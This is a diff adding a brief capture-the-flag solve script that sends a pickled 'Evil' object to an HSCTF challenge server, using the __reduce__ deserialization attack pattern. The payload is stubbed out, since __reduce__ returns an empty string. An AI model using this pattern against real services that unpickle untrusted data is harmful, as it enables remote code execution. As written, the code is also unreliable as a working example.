@@ -1,0 +1,13 @@
+from ptrlib import *
+import pickle
+
+class Evil(object):
+    def __reduce__(self):
+        return ""
+
+a = pickle.dumps(Evil())
+sock = Socket("misc.hsctf.com", 9977)
+sock.recvline()
+sock.sendline(a)
+
+sock.interactive()
